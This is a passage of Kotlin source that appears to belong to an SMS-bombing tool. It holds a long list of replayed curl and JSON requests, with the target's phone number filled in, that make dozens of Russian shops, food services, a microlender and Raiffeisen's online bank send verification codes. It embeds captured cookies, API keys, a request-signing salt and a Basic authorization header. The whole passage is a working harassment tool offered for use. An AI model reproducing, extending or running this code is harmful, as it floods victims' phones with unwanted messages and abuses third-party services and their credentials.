                          --data-raw '{"phone":"+{phone:7(***) ***-****}"}' \
                          --compressed
                          """.trimIndent(), 7
    ),

    CurlService(
        """
                        curl 'https://dobropizza.ru/ajaxopen/user_ask_password' \
                          -H 'authority: dobropizza.ru' \
                          -H 'accept: */*' \
                          -H 'accept-language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \
                          -H 'content-type: application/x-www-form-urlencoded' \
                          -H 'cookie: __ddg1_=KvHU7nV7hPLtYMAtACK2; session=oeo88lep1buhribfl0r63b7ts1; order_items=[]; order_sets=[]; _gid=GA1.2.1536561624.1682939991; _gat=1; _ym_uid=1648578784303133306; _ym_d=1682939992; _ym_isad=2; _ga_3DW5K9H240=GS1.1.1682939991.1.0.1682939991.0.0.0; _ga=GA1.1.623834408.1682939991; _ym_visorc=w' \
                          -H 'origin: https://dobropizza.ru' \
                          -H 'referer: https://dobropizza.ru/' \
                          -H 'sec-ch-ua: "Google Chrome";v="108", "Chromium";v="108", "Not=A?Brand";v="24"' \
                          -H 'sec-ch-ua-mobile: ?0' \
                          -H 'sec-ch-ua-platform: "Windows"' \
                          -H 'sec-fetch-dest: empty' \
                          -H 'sec-fetch-mode: cors' \
                          -H 'sec-fetch-site: same-origin' \
                          -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36' \
                          --data-raw 'username={formatted_phone:%2B*(***)%20***-**-**}&cis=882' \
                          --compressed
                          """.trimIndent(), 7
    ),

    object : JsonService("https://xn--80adjkr6adm9b.xn--p1ai/api/v5/user/start-authorization", 7) {
        fun generateMd5(input: String): String {
            val md = MessageDigest.getInstance("MD5")
            val mdBytes = md.digest(input.toByteArray(StandardCharsets.UTF_8))
            val bigInt = BigInteger(1, mdBytes)
            var md5Hex = bigInt.toString(16)
            while (md5Hex.length < 32)
                md5Hex = "0$md5Hex"
            return md5Hex
        }

        override fun buildJson(phone: Phone): String {
            request.header(
                "Cookie",
                "JSESSIONID=7D4E3639AA59094CE97756A898BADBCA; org.springframework.web.servlet.i18n.CookieLocaleResolver.LOCALE=ru; _ga=GA1.2.1521279070.1644593314; _gid=GA1.2.430099716.1682940568; _fbp=fb.1.1682940567889.253285313; _ym_uid=1644593314239563437; _ym_d=1682940568; _ym_isad=2; _ym_visorc=w; scroll=1"
            )

            val json = JSONObject()
            json.put("phone", format(phone.phone, "+7 *** ***-**-**"))
            json.put("signature", generateMd5("713062a852687fce429456474924fb1b$phone"))

            return json.toString()
        }
    },

    object : Service(7) {
        override fun run(
            client: OkHttpClient,
            callback: Callback,
            phone: Phone
        ) {
            CurlService(
                """
                                curl 'https://online.raiffeisen.ru/id/oauth/id/token' \
                                  -H 'Accept: application/json, text/plain, */*' \
                                  -H 'Accept-Language: ru' \
                                  -H 'Authorization: Basic cHJvZC1jbGllbnQtaWQ6eHh+Yjd9ZU8yUSR7eVkqe3ROTDRTZTBhaiR5KkA0Uks=' \
                                  -H 'Connection: keep-alive' \
                                  -H 'Content-Type: application/json;charset=UTF-8' \
                                  -H 'Cookie: geo_site=www; geo_region_url=www; site_city=%D0%9C%D0%BE%D1%81%D0%BA%D0%B2%D0%B0; site_city_id=2; APPLICATION_CONTEXT_CITY=21; mobile=false; device=pc; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2023-05-01%2015%3A49%3A14%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.raiffeisen.ru%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2023-05-01%2015%3A49%3A14%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.raiffeisen.ru%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F108.0.0.0%20Safari%2F537.36; _ga=GA1.2.1258444119.1682945354; _gid=GA1.2.1528676486.1682945354; _gat=1; sbjs_session=pgs%3D2%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.raiffeisen.ru%2F; _ym_uid=168294535524853204; _ym_d=1682945355; _ym_isad=2; _ym_visorc=b; _ga=GA1.1.1258444119.1682945354; _gid=GA1.1.1528676486.1682945354; rc-locale=ru; __zzat129=MDA0dBA=Fz2+aQ==; cfids129=tfPb9m2FDzAtzDxDGNCHtg2gRw3I+W5zB9sSeLkgrIXPha3CQIINjur9H+yGCzyyTW1A0ysA1ykuGlRBnax2t/eIbnuv5e5z6mKy35bWrhkEFQqptwVybhJGvCQLcW+8NvB5XDqJF7qDlYozzEOl3gCZBTjppOEF0RWa' \
                                  -H 'Origin: https://online.raiffeisen.ru' \
                                  -H 'RC-Device: web' \
                                  -H 'Referer: https://online.raiffeisen.ru/login/main' \
                                  -H 'Sec-Fetch-Dest: empty' \
                                  -H 'Sec-Fetch-Mode: cors' \
                                  -H 'Sec-Fetch-Site: same-origin' \
                                  -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36' \
                                  -H 'X-Device-Id: c1ffdfd4-39e0-4ca8-8cda-c9e9724c2a01' \
                                  -H 'X-Request-Id: 8da94bed-caab-4aec-b278-4e6a190dc59d' \
                                  -H 'X-Session-Id: 3e513fa3-b01b-4b5c-a23c-18bcef0fe53e' \
                                  -H 'sec-ch-ua: "Google Chrome";v="108", "Chromium";v="108", "Not=A?Brand";v="24"' \
                                  -H 'sec-ch-ua-mobile: ?0' \
                                  -H 'sec-ch-ua-platform: "Windows"' \
                                  --data-raw '{"grant_type":"phone","phone":"{full_phone}"}' \
                                  --compressed
                                  """.trimIndent()
            ).run(client, callback@{ call: Call?, response: Response ->
                try {
                    val body = response.body

                    if (body == null) {
                        callback.onResponse(call!!, response)
                        return@callback
                    }

                    val json = JSONObject(body.string())

                    CurlService(
                        """curl 'https://online.raiffeisen.ru/id/oauth/mfa/otp/send' \
  -H 'Accept: application/json, text/plain, */*' \
  -H 'Accept-Language: ru' \
  -H 'Authorization: Basic cHJvZC1jbGllbnQtaWQ6eHh+Yjd9ZU8yUSR7eVkqe3ROTDRTZTBhaiR5KkA0Uks=' \
  -H 'Connection: keep-alive' \
  -H 'Content-Type: application/json;charset=UTF-8' \
  -H 'Cookie: geo_site=www; geo_region_url=www; site_city=%D0%9C%D0%BE%D1%81%D0%BA%D0%B2%D0%B0; site_city_id=2; APPLICATION_CONTEXT_CITY=21; mobile=false; device=pc; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2023-05-01%2015%3A49%3A14%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.raiffeisen.ru%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2023-05-01%2015%3A49%3A14%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.raiffeisen.ru%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F108.0.0.0%20Safari%2F537.36; _ga=GA1.2.1258444119.1682945354; _gid=GA1.2.1528676486.1682945354; _gat=1; sbjs_session=pgs%3D2%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.raiffeisen.ru%2F; _ym_uid=168294535524853204; _ym_d=1682945355; _ym_isad=2; _ym_visorc=b; _ga=GA1.1.1258444119.1682945354; _gid=GA1.1.1528676486.1682945354; rc-locale=ru; __zzat129=MDA0dBA=Fz2+aQ==; cfids129=tfPb9m2FDzAtzDxDGNCHtg2gRw3I+W5zB9sSeLkgrIXPha3CQIINjur9H+yGCzyyTW1A0ysA1ykuGlRBnax2t/eIbnuv5e5z6mKy35bWrhkEFQqptwVybhJGvCQLcW+8NvB5XDqJF7qDlYozzEOl3gCZBTjppOEF0RWa' \
  -H 'Origin: https://online.raiffeisen.ru' \
  -H 'RC-Device: web' \
  -H 'Referer: https://online.raiffeisen.ru/login/main' \
  -H 'Sec-Fetch-Dest: empty' \
  -H 'Sec-Fetch-Mode: cors' \
  -H 'Sec-Fetch-Site: same-origin' \
  -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36' \
  -H 'X-Device-Id: c1ffdfd4-39e0-4ca8-8cda-c9e9724c2a01' \
  -H 'X-Request-Id: c1b5cd8b-f217-4268-87fa-be44cd267236' \
  -H 'X-Session-Id: 3e513fa3-b01b-4b5c-a23c-18bcef0fe53e' \
  -H 'sec-ch-ua: "Google Chrome";v="108", "Chromium";v="108", "Not=A?Brand";v="24"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'sec-ch-ua-platform: "Windows"' \
  --data-raw '{"mfa_token":"${json.getString("access_token")}"}' \
  --compressed"""
                    ).run(client, callback, phone)
                } catch (e: NullPointerException) {
                    callback.onError(call!!, e)
                } catch (e: JSONException) {
                    callback.onError(call!!, e)
                }
            }, phone)
        }
    },

    object : Service(7) {
        override fun run(
            client: OkHttpClient,
            callback: Callback,
            phone: Phone
        ) {
            client.newCall(
                Request.Builder()
                    .url("https://kronshtadt.food-port.ru/api/user/generate-password")
                    .header("x-thapl-apitoken", "0b84683a-14b6-11ed-9881-d00d1849d38c")
                    .header("x-thapl-domain", "kronshtadt.food-port.ru")
                    .header("x-thapl-region-id", "2")
                    .post(
                        """
    ------WebKitFormBoundaryd1lHEip8CBDSaYZd
    Content-Disposition: form-data; name="phone"
    
    ${format(phone.phone, "+7 *** *** ** **")}
    ------WebKitFormBoundaryd1lHEip8CBDSaYZd--
    """.trimIndent().toRequestBody("multipart/form-data; boundary=----WebKitFormBoundaryd1lHEip8CBDSaYZd".toMediaType())
                    )
                    .build()
            ).enqueue(callback)
        }
    },

    object : Service(7) {
        override fun run(
            client: OkHttpClient,
            callback: Callback,
            phone: Phone
        ) {
            client.newCall(
                Request.Builder()
                    .url("https://megafon.tv/")
                    .get().build()
            ).enqueue(Callback { call: Call?, response: Response ->
                val json = JSONObject()
                json.put("msisdn", "+$phone")
                json.put("password", "91234657111")

                val cookie = StringBuilder()
                for (entry in response.headers("Set-Cookie")) {
                    cookie.append(entry.split(";".toRegex()).dropLastWhile { it.isEmpty() }.toTypedArray()[0])
                    cookie.append("; ")
                }

                try {
                    client.newCall(
                        Request.Builder()
                            .url("https://bmp.megafon.tv/api/v10/auth/register/msisdn")
                            .addHeader("Cookie", cookie.toString())
                            .post(json.toString().toRequestBody("application/json".toMediaType()))
                            .build()
                    ).enqueue(callback)
                } catch (e: NullPointerException) {
                    callback.onError(call!!, e)
                }
            })
        }
    },

    CurlService(
        """
                        curl 'https://kviku.ru/cards/default/SendCodeApproveDocs' \
                          -H 'authority: kviku.ru' \
                          -H 'accept: */*' \
                          -H 'accept-language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \
                          -H 'content-type: application/x-www-form-urlencoded; charset=UTF-8' \
                          -H 'cookie: __ddgid_=QuxiFmvjT6F5LIPP; __ddgmark_=dnEsSdMKyfoJfg8v; __ddg5_=PuRUVC3m66hGDuTe; __ddg2_=6YlqkKfC9us3JJOv; __ddg3=b8vujzMEmR6C9Lw2; __ddg1_=JFjpHwDnXoYWzbWenBvx; PHPSESSID=qe2vlho56ig034s0dmm1l1nv02; ref_key=1; geo_country=RU; kid=6453d8e89848229eb7064ac60b6748d87727e5ef8f5ef636716fb49b8eb7bfaf3c23a9b36cf92b4470cec1f6ac3ca; _ym_uid=166124825777222614; _ym_d=1683216619; _ym_isad=2; _ym_visorc=w; _gid=GA1.2.1357022642.1683216619; pixel_sess_id=761b597b-3691-41c9-b99c-700063bb9635; pixel_user_fp=f24937e5c47dd4826c57c3f971f1cc59; pixel_user_dt=1683216619752; geo_country_popup=RU; _ga_F0ZPZ2R207=GS1.1.1683216618.1.1.1683216633.0.0.0; _ga=GA1.2.1858127879.1683216619' \
                          -H 'origin: https://kviku.ru' \
                          -H 'referer: https://kviku.ru/cash/default/index' \
                          -H 'sec-ch-ua: "Google Chrome";v="108", "Chromium";v="108", "Not=A?Brand";v="24"' \
                          -H 'sec-ch-ua-mobile: ?0' \
                          -H 'sec-ch-ua-platform: "Windows"' \
                          -H 'sec-fetch-dest: empty' \
                          -H 'sec-fetch-mode: cors' \
                          -H 'sec-fetch-site: same-origin' \
                          -H 'x-requested-with: XMLHttpRequest' \
                          --data-raw 'phone=%2B{formatted_phone:*-***-***-****}' \
                          --compressed
                          """.trimIndent(), 7
    ),

    CurlService(
        """
                        curl 'https://www.sportdepo.ru/auth/?login=yes&ajax=Y' \
                          -H 'authority: www.sportdepo.ru' \
                          -H 'accept: */*' \
                          -H 'accept-language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \
                          -H 'content-type: application/x-www-form-urlencoded; charset=UTF-8' \
                          -H 'cookie: PHPSESSID=JGY41Koc4F6vDeRbkjfUc9lzWaNCMOd1; BITRIX_SM_GUEST_ID=5392875; BITRIX_SM_LAST_ADV=5_Y; BITRIX_CONVERSION_CONTEXT_s1=%7B%22ID%22%3A9%2C%22EXPIRE%22%3A1683493140%2C%22UNIQUE%22%3A%5B%22conversion_visit_day%22%5D%7D; _ym_uid=1683455687159745799; _ym_d=1683455687; BX_USER_ID=d7f672cdeaafc9313a532a213faa66f4; _ym_isad=2; _ym_visorc=w; BITRIX_SM_LAST_VISIT=07.05.2023+13%3A34%3A48' \
                          -H 'origin: https://www.sportdepo.ru' \
                          -H 'referer: https://www.sportdepo.ru/' \
                          -H 'sec-ch-ua: "Google Chrome";v="108", "Chromium";v="108", "Not=A?Brand";v="24"' \
                          -H 'sec-ch-ua-mobile: ?0' \
                          -H 'sec-ch-ua-platform: "Windows"' \
                          -H 'sec-fetch-dest: empty' \
                          -H 'sec-fetch-mode: cors' \
                          -H 'sec-fetch-site: same-origin' \
                          -H 'x-requested-with: XMLHttpRequest' \
                          --data-raw 'AUTH_FORM_SMS=Y&AUTH_FORM_SMS_ACTION=send&backurl=%2Fauth%2F&USER_PHONE=%2B{phone:7+(***)+***-**-**}&AUTH_SMS_CODE=' \
                          --compressed
                          """.trimIndent(), 7
    ),

    CurlService(
        """
                        curl 'https://mybile.secret-kitchen.ru/api/v1/sms/send_code' \
                          -H 'Accept: */*' \
                          -H 'Accept-Language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \
                          -H 'Business: sk' \
                          -H 'Connection: keep-alive' \
                          -H 'Content-Type: application/json' \
                          -H 'Deviceid: 204cc159-8a91-4d8c-befc-7e401d58a15f' \
                          -H 'Origin: https://secret-kitchen.ru' \
                          -H 'Platformid: site' \
                          -H 'Referer: https://secret-kitchen.ru/' \
                          -H 'Sec-Fetch-Dest: empty' \
                          -H 'Sec-Fetch-Mode: cors' \
                          -H 'Sec-Fetch-Site: same-site' \
                          -H 'sec-ch-ua: "Google Chrome";v="108", "Chromium";v="108", "Not=A?Brand";v="24"' \
                          -H 'sec-ch-ua-mobile: ?0' \
                          -H 'sec-ch-ua-platform: "Windows"' \
                          --data-raw '{"phone":"{phone}","type":"auth","apiKey":"eb2090ca404dbf4d52b42e1221392ff02193ee9f4b81e67262dbc39e72d3170b"}' \
                          --compressed
                          """.trimIndent(), 7
    ),

    CurlService(
        """
                        curl 'https://kingsushi.pro/api/auth/sms' \
                          -H 'authority: kingsushi.pro' \
                          -H 'accept: application/json, text/plain, */*' \
                          -H 'accept-language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \
                          -H 'content-type: application/json;charset=UTF-8' \
                          -H 'cookie: _ym_uid=1683456639375639865; _ym_d=1683456639; _ga=GA1.2.48120215.1683456639; _gid=GA1.2.1465262980.1683456639; _gat=1; _ym_visorc=w; _ym_isad=2; _gat_gtag_UA_112669561_15=1; XSRF-TOKEN=eyJpdiI6Im5MTEN1dklSeVVUa2h3c3VDMi9nQkE9PSIsInZhbHVlIjoiR3lxbVN5ZEVaanlGa3VTN3JYeVRkKzkwdkNrWU5yUHZUWjBTZjl6WXpFYkMvcVBTb0hkK0hmVktqRjRpQUxnL1JiVHBnUGZGVGE3ckJ2MGl5cjNLZmg5aHZOWm9ueGNRSnRFTEJDSFVFeHRhYlFDUWp6aWIwVW0vVmRXUkJ5Q0giLCJtYWMiOiJjZDNlYmU5MDhiMGMzYmU1NDBhMjBiZTRiMDNhMmU2NDFlNmVlOTRiZmYwZGYzYjZiNmZkOTEyNzQ2MThhMjQ4IiwidGFnIjoiIn0%3D; kingsushi_session=eyJpdiI6Ik9KZHNFUW92eElIdEtNeXRjczVldFE9PSIsInZhbHVlIjoiOFFmbWxaWllTQ0VraEtOTnZ1dkhaU0lNSVVQdmZCSUg2Zmk1cENDSlA5ang2V3JLSWFGUm1sMEZZSXB5Y1l5Q09xVlBzSTE3ZTdiNE4vSUkySFhSOFprVkpqUW0xamVCaXpON1VkREVHUjRXaWFReFpGZkQ3NkhMRkNiVnB1dW4iLCJtYWMiOiIzZTQ1YmQ5OTRhZDAxN2RkNGIxNzY3ZTYxYWUxNDlmY2IxMmU0NDBlMjczMGMyZGMzMDA5ZTI2NDliNTNmODIwIiwidGFnIjoiIn0%3D; true_http_referer=https%3A%2F%2Fkingsushi.pro%2F' \
                          -H 'origin: https://kingsushi.pro' \
                          -H 'referer: https://kingsushi.pro/' \
                          -H 'sec-ch-ua: "Google Chrome";v="108", "Chromium";v="108", "Not=A?Brand";v="24"' \
                          -H 'sec-ch-ua-mobile: ?0' \
                          -H 'sec-ch-ua-platform: "Windows"' \
                          -H 'sec-fetch-dest: empty' \
                          -H 'sec-fetch-mode: cors' \
                          -H 'sec-fetch-site: same-origin' \
                          -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36' \
                          -H 'x-xsrf-token: eyJpdiI6Im5MTEN1dklSeVVUa2h3c3VDMi9nQkE9PSIsInZhbHVlIjoiR3lxbVN5ZEVaanlGa3VTN3JYeVRkKzkwdkNrWU5yUHZUWjBTZjl6WXpFYkMvcVBTb0hkK0hmVktqRjRpQUxnL1JiVHBnUGZGVGE3ckJ2MGl5cjNLZmg5aHZOWm9ueGNRSnRFTEJDSFVFeHRhYlFDUWp6aWIwVW0vVmRXUkJ5Q0giLCJtYWMiOiJjZDNlYmU5MDhiMGMzYmU1NDBhMjBiZTRiMDNhMmU2NDFlNmVlOTRiZmYwZGYzYjZiNmZkOTEyNzQ2MThhMjQ4IiwidGFnIjoiIn0=' \
                          --data-raw '{"phone":"+{phone:7 (***) ***-**-**}"}' \
                          --compressed
                          """.trimIndent(), 7
    ),

    CurlService(
        """
                        curl 'https://api.rollex.ru/api/v4/auth/register' \
                          -H 'authority: api.rollex.ru' \
                          -H 'accept: */*' \
                          -H 'accept-language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \
                          -H 'content-type: application/json' \
                          -H 'keywordapi: ProjectVApiKeyword' \
                          -H 'origin: https://rollex.ru' \
                          -H 'platformname: Site' \
                          -H 'referer: https://rollex.ru/' \
                          -H 'sec-ch-ua: "Google Chrome";v="108", "Chromium";v="108", "Not=A?Brand";v="24"' \
                          -H 'sec-ch-ua-mobile: ?0' \
                          -H 'sec-ch-ua-platform: "Windows"' \
                          -H 'sec-fetch-dest: empty' \
                          -H 'sec-fetch-mode: cors' \
                          -H 'sec-fetch-site: same-site' \
                          -H 'usedapiversion: 6' \
                          -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36' \
                          --data-raw '"+{full_phone}"' \
                          --compressed
                          """.trimIndent(), 7
    ),

    CurlService(
        """
                        curl 'https://shop.gretta.ru/module/kbmobilelogin/verification' \
                          -H 'authority: shop.gretta.ru' \
                          -H 'accept: application/json, text/javascript, */*; q=0.01' \
                          -H 'accept-language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \
                          -H 'content-type: application/x-www-form-urlencoded; charset=UTF-8' \
                          -H 'cookie: __utma=43524467.311017584.1683457855.1683457855.1683457855.1; __utmc=43524467; __utmz=43524467.1683457855.1.1.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided); __utmt=1; __utmb=43524467.1.10.1683457855; _ym_uid=1683457856850113444; _ym_d=1683457856; _ym_visorc=w; _ym_isad=2; PHPSESSID=bpholhcnbcqqitellf3m0slpt4; PrestaShop-716f306ed4cabd7967d4642f10a5b8e5=fe09d12642f7924ddf4e829d8aae696b3e6c852b21132fe3e4e676918527ac46%3A4lDPy0ozvb8rsuoRJPlColJ4jKLUQU7sEOsyzEgT1l%2BT8ZL8f5p%2BOoHVVmi7hZ5B6jhL2MaQvYdByIKUSfHuCAeiN%2BFXAWG7nX7p2WxvezGeUEZd6YIRsdEeBtsDSwu15xTeiJAfkOxORV1fxmlZmDbZbv53Kw%2Foe6LSLaUne3k%3D; PrestaShop-42f3a2116b37f69bf8a9fe4a0af32fcb=94cb6bd0c5baed3019ab1387a5d75c5a3402f2b1e6d135c936fe0c7640a94bd9%3A4lDPy0ozvb8rsuoRJPlColJ4jKLUQU7sEOsyzEgT1l8m4GV7i11PPhJexOesxfWfNlGyeOpaQmigFkJBP7%2B%2F1NJTt85ItBk8jkhoWqgPfZw%3D; JivoSiteLoaded=1; _ga=GA1.2.311017584.1683457855; _gid=GA1.2.2002476263.1683457861; _gat=1; tmr_lvid=c51c3f31a65656375e187152a50ec3c5; tmr_lvidTS=1683457861236; popmechanic_sbjs_migrations=popmechanic_1418474375998%3D1%7C%7C%7C1471519752600%3D1%7C%7C%7C1471519752605%3D1; mindboxDeviceUUID=bb0643e8-bc08-4838-bf34-5b23a4221287; directCrm-session=%7B%22deviceGuid%22%3A%22bb0643e8-bc08-4838-bf34-5b23a4221287%22%7D; tmr_detect=0%7C1683457870581' \
                          -H 'origin: https://shop.gretta.ru' \
                          -H 'referer: https://shop.gretta.ru/authentication?back=my-account' \
                          -H 'sec-ch-ua: "Google Chrome";v="108", "Chromium";v="108", "Not=A?Brand";v="24"' \
                          -H 'sec-ch-ua-mobile: ?0' \
                          -H 'sec-ch-ua-platform: "Windows"' \
                          -H 'sec-fetch-dest: empty' \
                          -H 'sec-fetch-mode: cors' \
                          -H 'sec-fetch-site: same-origin' \
                          -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36' \
                          -H 'x-requested-with: XMLHttpRequest' \
                          --data-raw 'ajax=true&method=sendOTP&kbMobileNumber={phone}&kbCountryId=177' \
                          --compressed
                          """.trimIndent(), 7
    ),

    CurlService(
        """
                        curl 'https://ru.vivo.com/local/ajax/phone-register.php' \
                          -H 'authority: ru.vivo.com' \
                          -H 'accept: application/json, text/javascript, */*; q=0.01' \
                          -H 'accept-language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \
                          -H 'content-type: application/x-www-form-urlencoded; charset=UTF-8' \
                          -H 'cookie: PHPSESSID=v7Jy353SIOIBo7V6MmvwFhc4uiSu5uqS; compare=b%3A0%3B; favorites=b%3A0%3B; BITRIX_SM_SALE_UID=b75dc655abe562d566068db5c547c3de; _gcl_au=1.1.1185812979.1683459454; BITRIX_CONVERSION_CONTEXT_s1=%7B%22ID%22%3A20%2C%22EXPIRE%22%3A1683493140%2C%22UNIQUE%22%3A%5B%22conversion_visit_day%22%5D%7D; _ga_B2FE0GEYSM=GS1.1.1683459454.1.0.1683459454.60.0.0; cto_bundle=gu5DMl9tbXpHMDE1cWozTHNFOHMzdlRJekZWJTJCT2lXaVdpTSUyRldld3p5V3NuNHNXMHVaRCUyQk1WUEhScGJTSkhqaFVwRWNQJTJCOW1wQmF1S1BrQktkVE5QcVFPVFNOVVJZMVgwVyUyQmw5dmYzTHM1UkRJNGF4RWVBaUpEMHo4WG4xdWZmS1BPazQ; _ga=GA1.2.1762444711.1683459455; _gid=GA1.2.1856493311.1683459456; _gat_UA-129676176-1=1; _ym_uid=1683459456409107820; _ym_d=1683459456; tmr_lvid=f4ef43b9d73b0c04e3e02eeb5eaac8c2; tmr_lvidTS=1683459456266; adtech_uid=119c2cd1-86c7-4158-99cd-9fd6c255847e%3Avivo.com; top100_id=t1.7541176.257239660.1683459456682; last_visit=1683448656688%3A%3A1683459456688; global_uuid=0HGZEad2MZ5RRZMfE; convead_guest_uid=yQEQUta2JXkuhtZQj; BX_USER_ID=d7f672cdeaafc9313a532a213faa66f4; _gpVisits={"isFirstVisitDomain":true,"idContainer":"10002549"}; _tt_enable_cookie=1; _ttp=Dv_cIPj33RztXHg4To8Fsb1elge; _ym_isad=2; _ym_visorc=w; t3_sid_7541176=s1.1791601658.1683459456685.1683459457104.1.2; _gp10002549={"hits":1,"vc":1}; tmr_detect=0%7C1683459459056' \
                          -H 'origin: https://ru.vivo.com' \
                          -H 'referer: https://ru.vivo.com/' \
                          -H 'sec-ch-ua: "Google Chrome";v="108", "Chromium";v="108", "Not=A?Brand";v="24"' \
                          -H 'sec-ch-ua-mobile: ?0' \
                          -H 'sec-ch-ua-platform: "Windows"' \
                          -H 'sec-fetch-dest: empty' \
                          -H 'sec-fetch-mode: cors' \
                          -H 'sec-fetch-site: same-origin' \
                          -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36' \
                          -H 'x-requested-with: XMLHttpRequest' \
                          --data-raw 'REGISTER%5BLOGIN%5D=%2B{phone:7+(***)+***-**-**}' \
                          --compressed
                          """.trimIndent(), 7
    ),

    CurlService(
        """
                        curl 'https://lider-mart.ru/AuthorizationAjax/ValidPhone/' \
                          -H 'Accept: */*' \
                          -H 'Accept-Language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \
                          -H 'Connection: keep-alive' \
                          -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' \
                          -H 'Cookie: CodeBrowser=7EA28BBE788A2ECC7AC64B2CE3608CCF; _ga=GA1.1.307182496.1683460113; _ym_uid=1683460114343161023; _ym_d=1683460114; _ym_visorc=w; _ym_isad=2; runid=79B6E731CDBEC342C24DC054D6AE0D5E; userID=A46C3B54F2C9871CD81DAF7A932499C0; _ga_51FQ6Y1Z7J=GS1.1.1683460112.1.1.1683460143.29.0.0' \
                          -H 'Origin: https://lider-mart.ru' \
                          -H 'Referer: https://lider-mart.ru/cabinet/registration' \
                          -H 'Sec-Fetch-Dest: empty' \
                          -H 'Sec-Fetch-Mode: cors' \
                          -H 'Sec-Fetch-Site: same-origin' \
                          -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36' \
                          -H 'X-Requested-With: XMLHttpRequest' \
                          -H 'sec-ch-ua: "Google Chrome";v="108", "Chromium";v="108", "Not=A?Brand";v="24"' \
                          -H 'sec-ch-ua-mobile: ?0' \
                          -H 'sec-ch-ua-platform: "Windows"' \
                          --data-raw 'phone=%2B{phone:7+***+***+****}' \
                          --compressed
                          """.trimIndent(), 7
    ),

    CurlService(
        """
                        curl 'https://spb.partsdirect.ru/accounts/register?phone={phone}&action=getsms&from=modal' \
                          -H 'authority: spb.partsdirect.ru' \
                          -H 'accept: application/json, text/javascript, */*; q=0.01' \
                          -H 'accept-language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \
